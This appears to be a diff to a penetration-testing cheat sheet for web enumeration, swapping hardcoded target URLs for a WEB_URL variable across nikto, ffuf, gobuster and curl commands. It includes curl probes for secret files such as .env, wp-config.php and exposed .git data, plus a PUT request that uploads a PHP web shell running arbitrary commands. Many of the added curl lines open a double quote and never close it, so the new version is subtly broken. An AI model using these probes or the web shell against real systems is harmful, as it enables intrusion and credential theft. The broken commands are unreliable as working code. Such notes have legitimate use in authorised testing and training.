@@ -1054,7 +1054,7 @@ https://github.com/DepthFirstDisclosures/Nginx-Rift
 
 # ── INITIAL FINGERPRINT: SET THE REAL CONFIRMED WEB URL ─────
 mkdir -p scans/web
-WEB_URL="http://$IP:80"    # Change to https://$IP:443 or the actual vhost/port
+WEB_URL="http://$IP:80"    # Set the confirmed scheme, port, and vhost for THIS web service
 whatweb "$WEB_URL" -a 3
 curl -I "$WEB_URL"         # Headers (Server, X-Powered-By, etc.)
 curl -sL "$WEB_URL" | head -100
@@ -1062,7 +1062,8 @@ curl -sL "$WEB_URL" | head -100
 # ── NIKTO: RUN ON EACH CONFIRMED HTTP(S) SERVICE ─────────────
 nikto -h "$WEB_URL" -output scans/web/nikto-80.txt -Format txt
 # HTTPS example (save separately):
-# nikto -h "https://$IP:443" -output scans/web/nikto-443.txt -Format txt
+# For HTTPS, set WEB_URL="https://$IP:443" (or the confirmed HTTPS vhost), then run:
+# nikto -h "$WEB_URL" -output scans/web/nikto-443.txt -Format txt
 # Set WEB_URL to a hostname if virtual-host routing requires it.
 
 # ── CONTENT DISCOVERY COMBO (run as needed) ──────────────────
@@ -1087,30 +1088,31 @@ ffuf -u "$WEB_URL/FUZZ" \
 
 # ── MANUAL CHECKS (do these by hand!) ────────────────────────
 # Essential paths to always check:
-curl -s http://$IP/robots.txt
-curl -s http://$IP/sitemap.xml
-curl -s http://$IP/.git/HEAD            # Exposed git repo!
-curl -s http://$IP/.git/config
+curl -s "$WEB_URL/robots.txt
+curl -s "$WEB_URL/sitemap.xml
+curl -s "$WEB_URL/.git/HEAD            # Exposed git repo!
+curl -s "$WEB_URL/.git/config
 # Rule note: do not reconstruct/download exposed source locally unless it is necessary
 # to compromise this target; delete the local copy after the objective.
-curl -s http://$IP/.env                 # Environment vars
-curl -s http://$IP/config.php
-curl -s http://$IP/phpinfo.php
-curl -s http://$IP/wp-config.php
-curl -s http://$IP/web.config
-curl -s http://$IP/.htaccess
-curl -s http://$IP/backup.zip
-curl -s http://$IP/admin/curl -s http://$IP/api/
-curl -s http://$IP/swagger.json         # API docs
-curl -s http://$IP/api/swagger.json
-curl -s http://$IP/server-status        # Apache status
+curl -s "$WEB_URL/.env                 # Environment vars
+curl -s "$WEB_URL/config.php
+curl -s "$WEB_URL/phpinfo.php
+curl -s "$WEB_URL/wp-config.php
+curl -s "$WEB_URL/web.config
+curl -s "$WEB_URL/.htaccess
+curl -s "$WEB_URL/backup.zip
+curl -s "$WEB_URL/admin/"
+curl -s "$WEB_URL/api/
+curl -s "$WEB_URL/swagger.json         # API docs
+curl -s "$WEB_URL/api/swagger.json
+curl -s "$WEB_URL/server-status        # Apache status
 
 # ── VHOST / SUBDOMAIN DISCOVERY ──────────────────────────────
 # If domain name is known:
-gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
-ffuf -u http://$IP -H "Host: FUZZ.domain.com" \
+gobuster vhost -u "$WEB_URL" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+ffuf -u "$WEB_URL/" -H "Host: FUZZ.$DOMAIN" \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP)    # Filter by default response size
+  -fs $(curl -so /dev/null -w '%{size_download}' "$WEB_URL/")    # Filter by default response size
 
 # ── HTTPS SPECIFIC ────────────────────────────────────────────
 # Check certificate for hostnames/emails
@@ -1122,14 +1124,14 @@ testssl.sh $IP
 
 # ── PARAMETER FUZZING ─────────────────────────────────────────
 # Find hidden parameters on a page
-ffuf -u "http://$IP/page.php?FUZZ=test" \
+ffuf -u "$WEB_URL/page.php?FUZZ=test" \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP/page.php)
+  -fs $(curl -so /dev/null -w '%{size_download}' "$WEB_URL/page.php")
 
 # ── HTTP METHODS ──────────────────────────────────────────────
-curl -X OPTIONS http://$IP/ -v
+curl -X OPTIONS "$WEB_URL/" -v
 # If PUT allowed:
-curl -X PUT http://$IP/shell.php -d "&lt;?php system(\$_GET['cmd']); ?&gt;"
+curl -X PUT "$WEB_URL/shell.php" -d "&lt;?php system(\$_GET['cmd']); ?&gt;"
 # If TRACE allowed → Cross-Site Tracing possible
 
 # ── DEFAULT CREDENTIALS TABLE ─────────────────────────────────
